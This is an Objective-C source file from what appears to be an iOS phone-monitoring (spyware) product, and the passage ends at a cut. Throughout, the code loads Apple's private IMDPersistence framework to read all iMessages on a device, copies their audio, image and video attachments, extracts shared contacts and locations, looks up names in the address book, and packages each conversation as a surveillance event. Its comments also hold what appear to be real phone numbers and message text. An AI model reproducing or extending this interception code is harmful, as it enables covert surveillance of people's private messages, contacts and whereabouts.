//
//  IMessageCaptureManager.m
//  iMessageCaptureManager
//
//  Created by Makara Khloth on 2/1/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "IMessageCaptureManager-E.h"

#import "DefStd.h"
#import "EventCenter.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "DaemonPrivateHome.h"
#import <dlfcn.h>
#import "DateTimeFormat.h"

#import "CKTextMessagePart.h"
#import "CKMediaObjectMessagePart.h"
#import "CKDBMessage.h"
#import "CKDBMessage+IOS6.h"
#import "CKDBMessage+iOS8.h"
#import "CKMediaObject.h"
#import "CKMediaObject+iOS8.h"

#import "AddressbookUtils.h"
#import "ABContactsManager.h"

#import "IMDMessageStore.h"
#import "IMMessageItem.h"

#import <objc/runtime.h>

@implementation IMessageCaptureManager

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
	}
	return (self);
}

- (void)captureiMessage
{
    //Process last iMessage to FXSmsEvent
    //Get last captured iMessage timestamp and array
    NSInteger lastiMessageTimeStamp = -1;
    NSArray *lastiMessageIDs = [NSArray array];
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    path = [path stringByAppendingPathComponent:@"lastiMessages.plist"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    if ([fileManager fileExistsAtPath:path]) {
        NSDictionary *lastiMessagesDic = [NSDictionary dictionaryWithContentsOfFile:path];
        lastiMessageTimeStamp = [lastiMessagesDic[@"lastiMessageTimeStamp"] integerValue];
        lastiMessageIDs = lastiMessagesDic[@"lastiMessageIDs"];
    }
    
    NSMutableArray *captureiMessageIDArray = [NSMutableArray array];
    __block NSInteger captureiMessageTimeStamp = -1;
    
    //For first time capture the lastest iMessage
    if (lastiMessageTimeStamp == -1) {
        NSMutableArray *alliMessageArray = [IMessageCaptureManager iMessageObjectsFromeFramework];
        if (alliMessageArray.count > 0) {
            CKDBMessage *lastestiMessage =  alliMessageArray[0];
            [self processiMessageObject:lastestiMessage];
            [captureiMessageIDArray addObject:[NSNumber numberWithInt:lastestiMessage.identifier]];
            captureiMessageTimeStamp = [lastestiMessage.date timeIntervalSince1970];
        }
    }
    else {//After first time we have to check all iMessage that newer than last timestamp
        NSMutableArray *alliMessageArray = [IMessageCaptureManager uncapturediMessageObjectsFromeFramework];
        [alliMessageArray enumerateObjectsUsingBlock:^(CKDBMessage *iMessage, NSUInteger idx, BOOL *stop) {
            __block BOOL isCaptured = NO;
            int iMessageUniqueID = iMessage.identifier;
            
            if ([iMessage.date timeIntervalSince1970] >= lastiMessageTimeStamp) {
                [lastiMessageIDs enumerateObjectsUsingBlock:^(NSNumber *capturediMessageUniqueID, NSUInteger idx, BOOL *stop) {
                    if ([capturediMessageUniqueID intValue] == iMessageUniqueID) {
                        isCaptured = YES;
                        *stop = YES;
                    }
                }];
                
                if (!isCaptured) {
                    [self processiMessageObject:iMessage];
                    [captureiMessageIDArray addObject:[NSNumber numberWithInt:iMessageUniqueID]];
                    
                    if (captureiMessageTimeStamp == -1 ){
                        captureiMessageTimeStamp = [iMessage.date timeIntervalSince1970];
                    }
                }
            }
        }];
    }
    
    if (captureiMessageTimeStamp > -1 && captureiMessageIDArray.count > 0) {
        NSDictionary *lastiMessagesDic = @{@"lastiMessageTimeStamp": [NSNumber numberWithInteger:captureiMessageTimeStamp],
                                           @"lastiMessageIDs" : captureiMessageIDArray};
        
        NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
        path = [path stringByAppendingPathComponent:@"lastiMessages.plist"];
        
        [lastiMessagesDic writeToFile:path atomically:YES];
    }
}

- (void)processiMessageObject:(CKDBMessage *)aMessage
{
    FxIMEvent *event = [IMessageCaptureManager createiMessageEventFromMessage:aMessage];
    
    // If shared contact, shared location contains text we separate the iMessage into two
    if ([IMessageCaptureManager haveToCopyMessage:aMessage]) {
        NSString *contactName = nil;
        NSString *locNameAddr = nil;
        
        // Attachments, shared contact, shared location
        Class $CKContactMediaObject = objc_getClass("CKContactMediaObject");    // Contact file
        Class $CKVCardMediaObject = objc_getClass("CKVCardMediaObject");        // Contact file (iOS 6)
        // Calendar file
        Class $CKLocationMediaObject = objc_getClass("CKLocationMediaObject");  // Location file (CKLocationMediaObject subclass of CKContactMediaObject)
        
        for (CKMediaObject *mediaObject in aMessage.mediaObjects) {
            NSURL *fileURL = [NSURL fileURLWithPath:[mediaObject filename]]; // Below iOS 8
            if ([mediaObject respondsToSelector:@selector(fileURL)]) { // iOS 8
                fileURL = [mediaObject fileURL];
            }
            NSString *filePath = [fileURL path];
            filePath = [filePath stringByReplacingOccurrencesOfString:@"/var/root/" withString:@"/var/mobile/"];
            NSString *savedFilePath = [NSString stringWithFormat:@"%@%f%@", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject], [[aMessage date] timeIntervalSince1970], [fileURL lastPathComponent]];
            
            DLog(@"mediaObject class    = %@", [mediaObject class]);
            DLog(@"savedFilePath        = %@", savedFilePath);
            DLog(@"filePath             = %@", filePath);
            DLog(@"fileURL              = %@", fileURL);
            DLog(@"fileURL, path        = %@", [fileURL path]);
            
            if ([mediaObject isKindOfClass:$CKLocationMediaObject]) {
                DLog(@"Location file");
                locNameAddr = [IMessageCaptureManager locationNameAddressWithLocationFileURL:[NSURL fileURLWithPath:filePath]];
                DLog(@"locNameAddr = %@", locNameAddr);
            } else if ([mediaObject isKindOfClass:$CKContactMediaObject] ||
                       [mediaObject isKindOfClass:$CKVCardMediaObject]) {
                DLog(@"Contact file");
                NSData *vCardData = [NSData dataWithContentsOfFile:filePath];
                DLog(@"vCardData length = %lu", (unsigned long)[vCardData length]);
                contactName = [AddressbookUtils getVCardStringFromData:vCardData];
                DLog(@"contactName = %@", contactName);
            }
        }
        
        NSString *copyMessage = contactName != nil ? contactName : locNameAddr;
        FxIMEvent *copyEvent = [event copyWithZone:nil];
        [copyEvent setMMessage:copyMessage];
        [copyEvent setMAttachments:nil];
        
        if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
            NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:copyEvent];
            for (FxEvent *imStructureEvent in imStructureEvents) {
                [mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
            }
        }
        
        [copyEvent release];
    }
    
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        DLog(@"SEND EVENT %@", event);
        
        NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:event];
        for (FxEvent *imStructureEvent in imStructureEvents) {
            [mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];
        }
    }
    
    [event release];
}

+ (FxIMEvent *)createiMessageEventFromMessage:(CKDBMessage *)aMessage
{
    // Message
    NSString *eventDateTime         = nil;
    NSDate *dateTime                = nil;
    FxEventDirection direction      = kEventDirectionUnknown;
    NSString *imServiceID           = @"iMessage";
    FxIMServiceID serviceID         = kIMServiceiMessage;
    FxIMMessageRepresentation rep   = (kIMMessageNone | kIMMessageText);
    NSString *convID                = nil;
    NSString *convName              = nil;
    NSString *message               = nil;
    NSString *userID                = nil;
    NSString *userDisplayName       = nil;
    BOOL isOutgoing                 = NO;
    NSArray *participants           = nil;
    NSArray *attachments            = nil;
    
    /*
     double dateTimeInterval = [rs doubleForColumn:@"date"];
     dateTime                = [NSDate dateWithTimeIntervalSinceReferenceDate:dateTimeInterval];
     message                 = [rs objectForColumnName:@"text"];
     user                    = [rs objectForColumnName:@"account"];
     isOutgoing              = [rs boolForColumn:@"is_from_me"];
     */
    
    DLog(@"date         = %@", [aMessage date]);       // 2014-12-30 04:53:39 +0000
    DLog(@"isOutgoing   = %d", [aMessage isOutgoing]); // 0
    DLog(@"subject      = %@", [aMessage subject]);    // (null)
    DLog(@"text         = %@", [aMessage text]);       // I am fine thanks
    DLog(@"address      = %@", [aMessage address]);    // +66946741662
    DLog(@"recipients   = %@", [aMessage recipients]); // ("+66946741662")
    DLog(@"guid         = %@", [aMessage guid]);       // E443CC8F-3ADC-4DF7-B4DB-6C6FE4997996
    DLog(@"madridAccountGUID    = %@", [aMessage madridAccountGUID]);      // 7EFBD7A0-9D0C-4EC2-B63E-929E35B1B951
    DLog(@"madridAccountLogin   = %@", [aMessage madridAccountLogin]);     // P:+66818469733
    DLog(@"madridChatGUID       = %@", [aMessage madridChatGUID]);         // iMessage;-;+66946741662
    DLog(@"madridChatIdentifier = %@", [aMessage madridChatIdentifier]);   // +66946741662
    DLog(@"madridRoomname       = %@", [aMessage madridRoomname]);         // (null)
    DLog(@"madridService        = %@", [aMessage madridService]);          // iMessage
    DLog(@"madridAttributedBody = %@", [aMessage madridAttributedBody]);   // I am fine thanks {"__kIMMessagePartAttributeName" = 0;}
    DLog(@"groupID              = %@", [aMessage groupID]);                // +66946741662
    DLog(@"plainBody            = %@", [aMessage plainBody]);              // I am fine thanks
    //DLog(@"formattedAddress     = %@", [aMessage formattedAddress]);     // Called from unsupported user (0). This can only be called from user mobile(501)
    DLog(@"attachmentText       = %@", [aMessage attachmentText]);         // (null)
    if ([aMessage respondsToSelector:@selector(mediaObjects)]) { // iOS 8
        DLog(@"mediaObjects     = %@", [aMessage mediaObjects]);           // (null)
    }
    if ([aMessage respondsToSelector:@selector(messageParts)]) { // iOS below 8
        DLog(@"messageParts     = %@", [aMessage messageParts]);
    }
    
    dateTime = [aMessage date];
    if (dateTime) {
        eventDateTime = [DateTimeFormat dateTimeWithDate:dateTime];
    } else {
        eventDateTime = [DateTimeFormat phoenixDateTime];
    }
    isOutgoing      = [aMessage isOutgoing];
    direction       = (isOutgoing) ? kEventDirectionOut : kEventDirectionIn;
    message         = [aMessage previewText]; // text method return junk
    
    if (isOutgoing) {
        // User
        userID = [aMessage madridAccountLogin];
        userID = [userID lowercaseString];  // Make sure it's the same lower cases as userID from hooking
        NSArray *userIDComponents = [userID componentsSeparatedByString:@":"];
        if ([userIDComponents count] >= 2) {
            userDisplayName = [userIDComponents objectAtIndex:1];
            userDisplayName = [IMessageCaptureManager searchDisplayName:userDisplayName];
        }
        
        // Participants
        NSMutableArray *tempArray = [NSMutableArray array];
        NSArray *recipients = [aMessage recipients];
        for (NSString *recipientID in recipients) {
            FxRecipient *participant = [[FxRecipient alloc] init];
            [participant setRecipNumAddr:recipientID];
            NSString *recipientDisplayName = [IMessageCaptureManager searchDisplayName:recipientID];
            [participant setRecipContactName:recipientDisplayName];
            [tempArray addObject:participant];
            [participant release];
        }
        participants = tempArray;
    } else {
        // User
        userID = [aMessage address]; // address is always the sender in case of incoming
        userDisplayName = [aMessage address];
        userDisplayName = [IMessageCaptureManager searchDisplayName:userDisplayName];
        
        // Participants
        NSMutableArray *tempArray = [NSMutableArray array];
        NSArray *recipients = [aMessage recipients];
        NSString *recipientID = [aMessage madridAccountLogin];
        recipientID = [recipientID lowercaseString];    // Make sure it's the same lower cases as userID from hooking
        NSString *recipientDisplayName = nil;
        NSArray *recipientIDComponents = [recipientID componentsSeparatedByString:@":"];
        if ([recipientIDComponents count] >= 2) {
            recipientDisplayName = [recipientIDComponents objectAtIndex:1];
            recipientDisplayName = [IMessageCaptureManager searchDisplayName:recipientDisplayName];
        }
        FxRecipient *participant = [[FxRecipient alloc] init];
        [participant setRecipNumAddr:recipientID];
        [participant setRecipContactName:recipientDisplayName];
        [tempArray addObject:participant];
        [participant release];
        
        for (NSInteger i = 0; i < [recipients count]; i++) {
            NSString *recipientID = [recipients objectAtIndex:i];
            if (![recipientID isEqualToString:userID]) { // Exclude userID
                FxRecipient *participant = [[FxRecipient alloc] init];
                [participant setRecipNumAddr:recipientID];
                NSString *recipientDisplayName = [IMessageCaptureManager searchDisplayName:recipientID];
                [participant setRecipContactName:recipientDisplayName];
                [tempArray addObject:participant];
                [participant release];
            }
        }
        
        participants = tempArray;
    }
    
    // Conversation ID (key point to make conversion ID the same over again and again is that the order of recipients in the array must be same)
    for (int i = 0; i < [[aMessage recipients] count]; i++){
        NSString *participantID = [[aMessage recipients] objectAtIndex:i];
        if (i == 0) {
            convID = [NSString stringWithFormat:@"%@", participantID];
        } else {
            convID = [NSString stringWithFormat:@"%@,%@", convID, participantID];
        }
    }
    
    // Chat name
    for (int i = 0; i < [[aMessage recipients] count]; i++){
        NSString *participantID = [[aMessage recipients] objectAtIndex:i];
        NSString *participantDisplayName = [IMessageCaptureManager searchDisplayName:participantID];
        if (i == 0) {
            convName = [NSString stringWithFormat:@"%@", participantDisplayName];
        } else {
            convName = [NSString stringWithFormat:@"%@,%@", convName, participantDisplayName];
        }
    }
    
    // Attachments, shared contact, shared location
    Class $CKAudioMediaObject = objc_getClass("CKAudioMediaObject");        // Audio file
    Class $CKImageMediaObject = objc_getClass("CKImageMediaObject");        // Image file
    Class $CKCompressibleImageMediaObject = objc_getClass("CKCompressibleImageMediaObject"); // Image file (.png, .jpg iOS 6)
    Class $CKMovieMediaObject = objc_getClass("CKMovieMediaObject");        // Video file
    Class $CKVideoMediaObject = objc_getClass("CKVideoMediaObject");        // Video file (iOS 6)
    Class $CKContactMediaObject = objc_getClass("CKContactMediaObject");    // Contact file
    Class $CKVCardMediaObject = objc_getClass("CKVCardMediaObject");        // Contact file (iOS 6)
    // Calendar file
    Class $CKLocationMediaObject = objc_getClass("CKLocationMediaObject");  // Location file (CKLocationMediaObject subclass of CKContactMediaObject)
    
    BOOL copy = NO;
    NSString *locNameAddr = nil;
    NSString *contactName = nil;
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSMutableArray *tempArray = [NSMutableArray array];
    
    NSArray *mediaObjects = nil;
    if ([aMessage respondsToSelector:@selector(messageParts)]) { // Below iOS 8
        Class $CKTextMessagePart = objc_getClass("CKTextMessagePart");
        Class $CKMediaObjectMessagePart = objc_getClass("CKMediaObjectMessagePart");
        NSMutableArray *tempArray = [NSMutableArray array];
        NSArray *messageParts = [aMessage messageParts];
        for (id messagePart in messageParts) {
            if ([messagePart isKindOfClass:$CKTextMessagePart]) {
                ;
            } else if ([messagePart isKindOfClass:$CKMediaObjectMessagePart]) {
                CKMediaObject *mediaObject = [messagePart mediaObject];
                [tempArray addObject:mediaObject];
            }
        }
        mediaObjects = tempArray;
    } else if ([aMessage respondsToSelector:@selector(mediaObjects)]) { // iOS 8
        mediaObjects = [aMessage mediaObjects];
    }
    
    for (CKMediaObject *mediaObject in mediaObjects) {
        NSURL *fileURL = [NSURL fileURLWithPath:[mediaObject filename]]; // Below iOS 8
        if ([mediaObject respondsToSelector:@selector(fileURL)]) { // iOS 8
            fileURL = [mediaObject fileURL];
        }
        NSString *filePath = [fileURL path];
        filePath = [filePath stringByReplacingOccurrencesOfString:@"/var/root/" withString:@"/var/mobile/"];
        NSString *savedFilePath = [NSString stringWithFormat:@"%@%f%@", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject], [[aMessage date] timeIntervalSince1970], [fileURL lastPathComponent]];
        
        DLog(@"mediaObject class    = %@", [mediaObject class]);
        DLog(@"savedFilePath        = %@", savedFilePath);
        DLog(@"filePath             = %@", filePath);
        DLog(@"fileURL              = %@", fileURL);
        DLog(@"fileURL, path        = %@", [fileURL path]);
        
        FxAttachment *attachment = [[FxAttachment alloc] init];
        
        if ([mediaObject isKindOfClass:$CKAudioMediaObject]) {
            DLog(@"Audio file");
            [fileManager copyItemAtPath:filePath toPath:savedFilePath error:nil];
            [attachment setFullPath:savedFilePath];
            [tempArray addObject:attachment];
        } else if ([mediaObject isKindOfClass:$CKImageMediaObject] ||
                   [mediaObject isKindOfClass:$CKCompressibleImageMediaObject]) {
            DLog(@"Image file");
            [fileManager copyItemAtPath:filePath toPath:savedFilePath error:nil];
            [attachment setFullPath:savedFilePath];
            [tempArray addObject:attachment];
        } else if ([mediaObject isKindOfClass:$CKMovieMediaObject] ||
                   [mediaObject isKindOfClass:$CKVideoMediaObject]) {
            DLog(@"Video file");
            [fileManager copyItemAtPath:filePath toPath:savedFilePath error:nil];
            [attachment setFullPath:savedFilePath];
            [tempArray addObject:attachment];
        } else if ([mediaObject isKindOfClass:$CKLocationMediaObject]) {
            DLog(@"Location file");
            locNameAddr = [IMessageCaptureManager locationNameAddressWithLocationFileURL:[NSURL fileURLWithPath:filePath]];
            DLog(@"locNameAddr = %@", locNameAddr);
            if ([message length] > 0) {
                copy = YES;
            } else {
                message = locNameAddr;
            }
        } else if ([mediaObject isKindOfClass:$CKContactMediaObject] ||
                   [mediaObject isKindOfClass:$CKVCardMediaObject]) {
            DLog(@"Contact file");
            NSData *vCardData = [NSData dataWithContentsOfFile:filePath];
            DLog(@"vCardData length = %lu", (unsigned long)[vCardData length]);
            contactName = [AddressbookUtils getVCardStringFromData:vCardData];
            DLog(@"contactName = %@", contactName);
            if ([message length] > 0) {
                copy = YES;
            } else {
                message = contactName;
            }
        }
        [attachment release];
    }
    
    attachments = tempArray;
    
    FxIMEvent *event = [[FxIMEvent alloc] init];
    [event setDateTime:eventDateTime];
    [event setMDirection:direction];
    [event setMIMServiceID:imServiceID];
    [event setMServiceID:serviceID];
    [event setMConversationID:convID];
    [event setMConversationName:convName];
    [event setMMessage:message];
    [event setMRepresentationOfMessage:rep];
    [event setMUserID:userID];
    [event setMUserDisplayName:userDisplayName];
    [event setMParticipants:participants];
    [event setMAttachments:attachments];
    
    return event;
}

+ (BOOL) haveToCopyMessage:(CKDBMessage *)aMessage
{
    // Attachments, shared contact, shared location
    Class $CKContactMediaObject = objc_getClass("CKContactMediaObject");    // Contact file
    Class $CKVCardMediaObject = objc_getClass("CKVCardMediaObject");        // Contact file (iOS 6)
    // Calendar file
    Class $CKLocationMediaObject = objc_getClass("CKLocationMediaObject");  // Location file (CKLocationMediaObject subclass of CKContactMediaObject)

    
    NSString *message               = nil;
    BOOL copy = NO;
    
    message = aMessage.previewText;
    
    for (CKMediaObject *mediaObject in aMessage.mediaObjects) {
        if ([mediaObject isKindOfClass:$CKLocationMediaObject]) {
            DLog(@"Location file");
            if ([message length] > 0) {
                copy = YES;
            }
        } else if ([mediaObject isKindOfClass:$CKContactMediaObject] ||
                   [mediaObject isKindOfClass:$CKVCardMediaObject]) {
            DLog(@"Contact file");
            if ([message length] > 0) {
                copy = YES;
            }
        }
    }
    
    return copy;
}

+ (NSString *) locationNameAddressWithLocationFileURL: (NSURL *) aLocationFileUrl {
    NSString *locationNameAddresss = nil;
    NSString* googleurl =@"";
    NSString* address   =@"";
    // Extract vcf to String
    NSString *filePath = [aLocationFileUrl path];
    NSString *vCardString = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil ];
    DLog(@"vCardString %@",vCardString);
    // Use regular to get mapurl
    NSArray * extactvCard = [vCardString componentsSeparatedByString:@"\n"];
    for (int i =0; i< [extactvCard count]; i++) {
        
        if([[extactvCard objectAtIndex:i] rangeOfString:@".ADR;" options:NSCaseInsensitiveSearch].location != NSNotFound){
            DLog(@"*** address line %@",[extactvCard objectAtIndex:i]);
            NSString *removesymbol = [[extactvCard objectAtIndex:i]  stringByReplacingOccurrencesOfString:@";"withString:@" "];
            DLog(@"*** removesymbol %@",removesymbol);
            NSArray * extactonlcharacter = [removesymbol componentsSeparatedByString:@":"];
            DLog(@"*** extactonlcharacter %@",extactonlcharacter);
            address = [extactonlcharacter objectAtIndex:1];
            DLog(@"*** address %@ ",address);
        }
        
        if([[extactvCard objectAtIndex:i] rangeOfString:@"http://maps" options:NSCaseInsensitiveSearch].location != NSNotFound){
            
            DLog(@"*** url line %@",[extactvCard objectAtIndex:i]);
            NSArray * extactonlyurl = [[extactvCard objectAtIndex:i] componentsSeparatedByString:@"http:"];
            DLog(@"*** extactonlyurl %@",extactonlyurl);
            for (int j =0; j< [extactonlyurl count]; j++) {
                if([[extactonlyurl objectAtIndex:j] rangeOfString:@"//maps" options:NSCaseInsensitiveSearch].location != NSNotFound){
                    googleurl = [NSString stringWithFormat:@"http:%@",[extactonlyurl objectAtIndex:j]];
                    DLog(@"*** url %@ ",googleurl);
                }
            }
        }
    }
    
    // iOS 8, apple map, http://maps.apple.com/?ll=13.756858\,100.541700 , we need to delete backslash
    googleurl = [googleurl stringByReplacingOccurrencesOfString:@"\\" withString:@""];
    
    if([address length]>0){
        locationNameAddresss = [NSString stringWithFormat:@"%@\n%@",address,googleurl];
    }else{
        locationNameAddresss = [NSString stringWithFormat:@"%@",googleurl];
        
    }
    
    DLog(@"address %@, length %lu",address, (unsigned long)[address length]);
    DLog(@"googleurl %@",googleurl);
    
    return (locationNameAddresss);
}

+ (NSString *) searchDisplayName: (NSString *) aAddress {
    ABContactsManager *contactManager   = [[ABContactsManager alloc] init];
    NSString *displayName = nil;
    if ([aAddress rangeOfString:@"@"].location == NSNotFound) {
        displayName = [contactManager searchFirstNameLastName:aAddress contactID:-1];
    } else {
        displayName = [contactManager searchDistinctFirstLastNameWithEmailV2:aAddress];
    }
    
    if (![displayName length]) {
        displayName = aAddress;
    }
    [contactManager release];
    return (displayName);
}

+ (NSMutableArray *)iMessageObjectsFromeFramework
{
    void *libHandle = dlopen("/System/Library/PrivateFrameworks/IMDPersistence.framework/IMDPersistence", RTLD_NOW);
    
    //make/get symbol from framework + name
    dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    int (*IMDMessageRecordGetMessagesSequenceNumber)() = (int (*)())dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    NSArray *(*IMDMessageRecordCopyMessagesForRowIDs)(NSArray *rowIDs) = (NSArray *(*)())dlsym(libHandle, "IMDMessageRecordCopyMessagesForRowIDs");
    
    // get id of last SMS from symbol
    int lastID = IMDMessageRecordGetMessagesSequenceNumber();
    
    //Create IMDMessageStore to get message error status
    IMDMessageStore *messageStore = [IMDMessageStore sharedInstance];
    
    NSMutableArray *alliMessageArray = [[NSMutableArray alloc] init];
  
    for (int recordID = 0; recordID <= lastID; recordID++) {
        
        NSArray *imdMessageRecordArray = IMDMessageRecordCopyMessagesForRowIDs(@[[NSNumber numberWithInt:recordID]]);
    
        if (imdMessageRecordArray.count > 0) {
            CKDBMessage *message = [[CKDBMessage alloc] initWithRecordID:recordID];
            
            if (message) {
                IMMessageItem *messageItem = [messageStore messageWithGUID:message.guid];
                
                if (message.text.length > 0 && [message.madridService isEqualToString:@"iMessage"] && messageItem.errorCode == 0) {
                    [alliMessageArray addObject:message];
                }
            }
            
            [message release];
        }
        
        [imdMessageRecordArray release];
    }
    
    [alliMessageArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
    
    return [alliMessageArray autorelease];
}

+ (NSMutableArray *)uncapturediMessageObjectsFromeFramework
{
    NSInteger lastiMessageTimeStamp = -1;
    NSArray *lastiMessageIDs = [NSArray array];
    
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject];
    path = [path stringByAppendingPathComponent:@"lastiMessages.plist"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    if ([fileManager fileExistsAtPath:path]) {
        NSDictionary *lastiMessagesDic = [NSDictionary dictionaryWithContentsOfFile:path];
        lastiMessageTimeStamp = [lastiMessagesDic[@"lastiMessageTimeStamp"] integerValue];
        lastiMessageIDs = lastiMessagesDic[@"lastiMessageIDs"];
    }
    
    int lastiMessageID = [[[lastiMessageIDs sortedArrayUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"self" ascending:NO]]] firstObject] intValue];
    void *libHandle = dlopen("/System/Library/PrivateFrameworks/IMDPersistence.framework/IMDPersistence", RTLD_NOW);
    NSArray *(*IMDMessageRecordCopyMessagesForRowIDs)(NSArray *rowIDs) = (NSArray *(*)())dlsym(libHandle, "IMDMessageRecordCopyMessagesForRowIDs");
    
    //make/get symbol from framework + name
    dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    int (*IMDMessageRecordGetMessagesSequenceNumber)() = (int (*)())dlsym(libHandle, "IMDMessageRecordGetMessagesSequenceNumber");
    
    // get id of last SMS from symbol
    int lastID = IMDMessageRecordGetMessagesSequenceNumber();
    
    //Create IMDMessageStore to get message error status
    IMDMessageStore *messageStore = [IMDMessageStore sharedInstance];
    
    NSMutableArray *alliMessageArray = [[NSMutableArray alloc] init];
    
    for (int recordID = lastiMessageID; recordID <= lastID; recordID++) {
        
        NSArray *imdMessageRecordArray = IMDMessageRecordCopyMessagesForRowIDs(@[[NSNumber numberWithInt:recordID]]);
    
        if (imdMessageRecordArray.count > 0) {
            CKDBMessage *message = [[CKDBMessage alloc] initWithRecordID:recordID];
            
            if (message) {
                IMMessageItem *messageItem = [messageStore messageWithGUID:message.guid];
                
                if (message.text.length > 0 && [message.madridService isEqualToString:@"iMessage"] && messageItem.errorCode == 0) {
                    [alliMessageArray addObject:message];
                }
            }
            
            [message release];
        }
        
        [imdMessageRecordArray release];
    }
    
    [alliMessageArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
    
    return [alliMessageArray autorelease];
}

#pragma mark - Historical events -

+ (NSArray *) alliMessages {
    NSArray *alliMessages = [NSArray array];
    @try {
        NSMutableArray *alliMessageArray = [IMessageCaptureManager iMessageObjectsFromeFramework];
        NSMutableArray *sortediMessageArray = [[NSMutableArray alloc] init];
        
        [alliMessageArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
        
        [alliMessageArray enumerateObjectsUsingBlock:^(CKDBMessage *message, NSUInteger idx, BOOL *stop) {
            FxIMEvent *iMessageEvent= [IMessageCaptureManager createiMessageEventFromMessage:message];
            [sortediMessageArray addObject:iMessageEvent];
            
            // If shared contact, shared location contains text we separate the iMessage into two
            if ([self haveToCopyMessage:message]) {
                NSString *contactName = nil;
                NSString *locNameAddr = nil;
                
                // Attachments, shared contact, shared location
                Class $CKContactMediaObject = objc_getClass("CKContactMediaObject");    // Contact file
                Class $CKVCardMediaObject = objc_getClass("CKVCardMediaObject");        // Contact file (iOS 6)
                // Calendar file
                Class $CKLocationMediaObject = objc_getClass("CKLocationMediaObject");  // Location file (CKLocationMediaObject subclass of CKContactMediaObject)
                
                for (CKMediaObject *mediaObject in message.mediaObjects) {
                    NSURL *fileURL = [NSURL fileURLWithPath:[mediaObject filename]]; // Below iOS 8
                    if ([mediaObject respondsToSelector:@selector(fileURL)]) { // iOS 8
                        fileURL = [mediaObject fileURL];
                    }
                    NSString *filePath = [fileURL path];
                    filePath = [filePath stringByReplacingOccurrencesOfString:@"/var/root/" withString:@"/var/mobile/"];
                    NSString *savedFilePath = [NSString stringWithFormat:@"%@%f%@", [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) lastObject], [[message date] timeIntervalSince1970], [fileURL lastPathComponent]];
                    
                    DLog(@"mediaObject class    = %@", [mediaObject class]);
                    DLog(@"savedFilePath        = %@", savedFilePath);
                    DLog(@"filePath             = %@", filePath);
                    DLog(@"fileURL              = %@", fileURL);
                    DLog(@"fileURL, path        = %@", [fileURL path]);
                    
                    if ([mediaObject isKindOfClass:$CKLocationMediaObject]) {
                        DLog(@"Location file");
                        locNameAddr = [self locationNameAddressWithLocationFileURL:[NSURL fileURLWithPath:filePath]];
                        DLog(@"locNameAddr = %@", locNameAddr);
                    } else if ([mediaObject isKindOfClass:$CKContactMediaObject] ||
                               [mediaObject isKindOfClass:$CKVCardMediaObject]) {
                        DLog(@"Contact file");
                        NSData *vCardData = [NSData dataWithContentsOfFile:filePath];
                        DLog(@"vCardData length = %lu", (unsigned long)[vCardData length]);
                        contactName = [AddressbookUtils getVCardStringFromData:vCardData];
                        DLog(@"contactName = %@", contactName);
                    }
                }
                
                NSString *copyMessage = contactName != nil ? contactName : locNameAddr;
                FxIMEvent *copyEvent = [iMessageEvent copyWithZone:nil];
                [copyEvent setMMessage:copyMessage];
                [copyEvent setMAttachments:nil];
                
                [sortediMessageArray addObject:copyEvent];
                
                [copyEvent release];
            }
            
            [iMessageEvent release];
        }];
        
        NSArray *tempAlliMessages = [NSArray arrayWithArray:sortediMessageArray];
        [sortediMessageArray release];
        
        NSMutableArray *tempArray = [NSMutableArray array];
        
        for (FxIMEvent *event in tempAlliMessages) {
            NSArray *events = [FxIMEventUtils digestIMEvent:event];
            [tempArray addObjectsFromArray:events];
        }
        
        alliMessages = tempArray;
    }
    @catch (NSException *exception) {
        DLog(@"NS exception = %@", exception);
    }
    @catch (...) {
        DLog(@"Unknown exception");
    }
    @finally {
        ;
    }
    return (alliMessages);
}

+ (NSArray *) alliMessagesWithMax: (NSInteger) aMaxNumber {
    NSArray *someiMessages = [NSArray array];
    @try {
        NSMutableArray *alliMessageArray = [IMessageCaptureManager iMessageObjectsFromeFramework];
        NSMutableArray *sortediMessageArray = [[NSMutableArray alloc] init];
        
        [alliMessageArray sortUsingDescriptors:@[[NSSortDescriptor sortDescriptorWithKey:@"date" ascending:NO]]];
        
        [alliMessageArray enumerateObjectsUsingBlock:^(CKDBMessage *message, NSUInteger idx, BOOL *stop) {
            FxIMEvent *iMessageEvent= [IMessageCaptureManager createiMessageEventFromMessage:message];
            [sortediMessageArray addObject:iMessageEvent];
            
            // If shared contact, shared location contains text we separate the iMessage into two
            if ([self haveToCopyMessage:message]) {
                NSString *contactName = nil;
                NSString *locNameAddr = nil;
                
                // Attachments, shared contact, shared location
                Class $CKContactMediaObject = objc_getClass("CKContactMediaObject");    // Contact file
                Class $CKVCardMediaObject = objc_getClass("CKVCardMediaObject");        // Contact file (iOS 6)
                // Calendar file
